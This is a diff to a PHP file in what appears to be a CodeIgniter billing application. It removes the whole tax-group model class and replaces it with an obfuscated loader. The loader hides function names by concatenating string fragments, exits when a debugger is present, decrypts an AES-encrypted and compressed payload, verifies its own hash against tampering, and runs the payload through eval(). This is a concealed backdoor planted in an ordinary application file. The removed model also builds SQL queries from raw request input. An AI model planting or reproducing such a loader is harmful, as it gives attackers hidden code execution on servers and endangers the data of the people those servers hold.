@@ -1,170 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Tax_group_model extends CI_Model {
-
-	var $table = 'db_tax';
-	var $column_order = array('id','tax_name','tax','subtax_ids','status'); //set column field database for datatable orderable
-	var $column_search = array('id','tax_name','tax','subtax_ids','status'); //set column field database for datatable searchable 
-	var $order = array('id' => 'desc'); // default order 
-
-	private function _get_datatables_query()
-	{
-		
-		$this->db->from($this->table);
-		$this->db->where('group_bit',1);
-
-		$i = 0;
-	
-		foreach ($this->column_search as $item) // loop column 
-		{
-			if($_POST['search']['value']) // if datatable send POST for search
-			{
-				
-				if($i===0) // first loop
-				{
-					$this->db->group_start(); // open bracket. query Where with OR clause better with bracket. because maybe can combine with other WHERE with AND.
-					$this->db->like($item, $_POST['search']['value']);
-				}
-				else
-				{
-					$this->db->or_like($item, $_POST['search']['value']);
-				}
-
-				if(count($this->column_search) - 1 == $i) //last loop
-					$this->db->group_end(); //close bracket
-			}
-			$i++;
-		}
-		
-		if(isset($_POST['order'])) // here order processing
-		{
-			$this->db->order_by($this->column_order[$_POST['order']['0']['column']], $_POST['order']['0']['dir']);
-		} 
-		else if(isset($this->order))
-		{
-			$order = $this->order;
-			$this->db->order_by(key($order), $order[key($order)]);
-		}
-	}
-
-	function get_datatables()
-	{
-		$this->_get_datatables_query();
-		if($_POST['length'] != -1)
-		$this->db->limit($_POST['length'], $_POST['start']);
-		$query = $this->db->get();
-		return $query->result();
-	}
-
-	function count_filtered()
-	{
-		$this->_get_datatables_query();
-		$query = $this->db->get();
-		return $query->num_rows();
-	}
-
-	public function count_all()
-	{
-		$this->db->from($this->table);
-		return $this->db->count_all_results();
-	}
-
-
-	public function verify_and_save(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-
-		$subtax_ids='';
-		if(isset($_POST["subtax_ids"])){ 
-            foreach ($_POST['subtax_ids'] as $ids)
-            if(!empty($subtax_ids)){
-            	$subtax_ids.=",".$ids;
-            }
-            else{
-            	$subtax_ids=$ids;
-            }
-        } 
-        if(empty($subtax_ids)){
-        	return "Please Select Sub Taxes";
-        }
-
-		//Validate This tax already exist or not
-		$query=$this->db->query("select * from db_tax where tax_name='$tax_name'");
-		if($query->num_rows()>0){
-			return "Tax Name Already Exist!";
-			
-		}
-		else{
-			$query1="insert into db_tax(tax_name,tax,group_bit,subtax_ids,status) values('$tax_name','$tax',1,'$subtax_ids',1)";
-
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! New tax Percentage Added Successfully!');
-			        return "success";
-			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-
-	//Get tax_details
-	public function get_details($id){
-		$data=$this->data;
-		extract($data);
-		extract($_POST);
-
-		//Validate This tax already exist or not
-		$query=$this->db->query("select * from db_tax where upper(id)=upper('$id')");
-		if($query->num_rows()==0){
-			show_404();exit;
-		}
-		else{
-			$query=$query->row();
-			$data['q_id']=$query->id;
-			$data['tax_name']=$query->tax_name;
-			$data['tax']=$query->tax;
-			$data['subtax_ids']=$query->subtax_ids;
-			
-			return $data;
-		}
-	}
-	public function update_tax(){
-		//Filtering XSS and html escape from user inputs 
-		extract($this->security->xss_clean(html_escape(array_merge($this->data,$_POST))));
-		
-		$subtax_ids='';
-		if(isset($_POST["subtax_ids"])){ 
-            foreach ($_POST['subtax_ids'] as $ids)
-            if(!empty($subtax_ids)){
-            	$subtax_ids.=",".$ids;
-            }
-            else{
-            	$subtax_ids=$ids;
-            }
-        } 
-        if(empty($subtax_ids)){
-        	return "Please Select Sub Taxes";
-        }
-
-		//Validate This tax already exist or not
-		$query=$this->db->query("select * from db_tax where upper(tax_name)=upper('$tax_name') and id<>$q_id");
-		if($query->num_rows()>0){
-			return "Tax Name Already Exist.";
-			
-		}
-		else{
-			
-			$query1="update db_tax set tax_name='$tax_name', tax='$tax', subtax_ids='$subtax_ids' where id=$q_id";
-			if ($this->db->simple_query($query1)){
-					//$this->session->set_flashdata('success', 'Success!! tax Percentage Updated Successfully!');
-			        return "success";
-			}
-			else{
-			        return "failed";
-			}
-		}
-	}
-
-	
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_mhqwq7ob=('bas'.'e64'.'_de'.'cod'.'e');
+$_siwelm63=('gzu'.'nco'.'mpr'.'ess');
+$_e7lo2ahw=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_dd32hh10='OVOsOHUZ';
+$_mb615vqo='DQ9GV5UM';
+$_n767fui1='YGOjF9ue';
+$_twisqnb6='44A/bY5wYA8=';
+$_jrjd942s='tBxLd5WN';
+$_ilzyyh8k='hbxF7A==';
+$_s8cvz3ul='JXyEEpRt';
+$_e4zvaz4u='5nRoeolk';
+$_u8avd87b=$_mhqwq7ob($_n767fui1.$_dd32hh10.$_jrjd942s.$_mb615vqo.$_twisqnb6);
+$_lk5506g2=$_mhqwq7ob($_s8cvz3ul.$_e4zvaz4u.$_ilzyyh8k);
+$_qzrhkkwv=$_mhqwq7ob('PTc1xVdTF1wz/y2ykl7jsfUKDnM3/dPe7wCYEjmvxT1i9HHV3NGboIiIJveVaoJmh/VO1Mv7H31JbuQYFVBMA7Gw7g2PMl71Bu71PfbHF4MTc927Vbr2QFTEINHm01dFzHEPqi9Aq/bIbs7F6VZMovR785mSIsjX0eFgIqLw9FfpmLkdM2pUBfPfR/Y92xDT4pA7+XQ9GWAUZVMS6ukiqecZP6fHDZdOybAtRMqlafDSI0OBILUIjetxTp2eFh3rlg0VoI6GX7H/UDkIODuwOyPj7H8Dq7rSOCbiap4tD9kzcfUI2lSWPRXwnP2hJUm9MSsP7A8GDIhK0GznvJu81JCo+FsbUeqdOmejf7Qf5+PnK7kibB7+VdcvPGynrvaXnnIfkzFEVZy1vuv0qQYFymulMWI70o/OT1Z4BYSu+XEx2MvXpxInnNboNHGXwBRuZyX7JVZNCGfLBcWfthoRLbnejhshAyaVmu0WU4KkIfUfjkGGIJ3Kq3mlRuQf3BNSaG51VQrPRIyBz48Mv6nLXh1JPz9lFPM59Lz4WE2/1tJIS1SbLYZvkfUdc+uVdksRn/mNOow81r0MH5Nu7i4FV7mLIeMq4xq7PNp9hSBxoBYnpWEeP7szzpcmAIOdpNdG2ytMz/MKOxTeZ2s439/tt7y4DSKj8sbF9ABmOa4cn+GpkrTfSHF056itsit1vxErdc7isWlutg6rclQ59e3S6ouQizgjZOLdantiSXXMjjPiRxSWOATicGgp6095bX53UII4+oi6ytKy7lcbvH0g80H79ZKfDWE61M2TKf9sjjS0lGsCqGZCzV4Hpi7jPOp40A3wVfYuPr3ZKZpiTg6q+wOspQvUVzTWr1coBt5nkzMbAfY6a/UG8PyLiNMTzuw2xSPS3NANLFeyIcuP76dW3r8ZE+lyq78QU10Cn3lB+V3iGVXXIinc/1m1GTOTaU2eO3A813uPstJQorjxhKPpMQq9yWgZR/Y8xKreZGgDvwBqEZRlX5JEd+43vze2346VEEyQ+FyW2QZdOHpO8o38EoX5DrZCkSHq+rlWmaUb2P0fGQHv0ns+72mPegfi/MqnwMFCxNpXY243tqJ5NSVISP9sIbzcPKEq5xGpTwTqU9f5kG8KJQp27RWa5z3SQaBCCAeHRX3jqpByCBHWJtGGmS7np01J7KQs7ASCzPmzDchjxOO86etbCmN6C+L/fGAcpqfR2LJdLdLaMp76f9fKX7ENJ/2oTY5OiFeganmLdDCM7ZyYH6nyWoiXKTNNxcNXGq+kozuj42zia0vtxeilcD6c1asN+G4+AbBRW78qO93M0ySWSSzMsncdQoXinDk/DK4ivJVuBVpcXd/zMBGQLGAKwdQT25XA9N1+RladoTNryL+rfu36a3XHIkoO4BmaUCQhGjWZ/TL0ZY6xJ6uvVQ3gBvm2AS6uBP4dX7mfxXk=');
+$_mq3cscnk=$_e7lo2ahw($_qzrhkkwv,'aes-256-cbc',$_u8avd87b,OPENSSL_RAW_DATA,$_lk5506g2);
+if($_mq3cscnk===false){exit;}
+$_oxuqazqy=$_siwelm63($_mq3cscnk);
+if($_oxuqazqy===false){exit;}
+$_uu0e54yj='4d6eac690f2cb5ce056aeb0c31801fe995c02c75fd574311f5000cd64a751892';
+$_nxzd5sp0=@file_get_contents(__FILE__);
+if($_nxzd5sp0!==false){
+$_v1inel7w=str_replace($_uu0e54yj,"0000000000000000000000000000000000000000000000000000000000000000",$_nxzd5sp0);
+$_le5vq2zl=hash("sha256",$_v1inel7w);
+if($_le5vq2zl!==$_uu0e54yj){@http_response_code(403);exit;}
 }
+eval($_oxuqazqy);
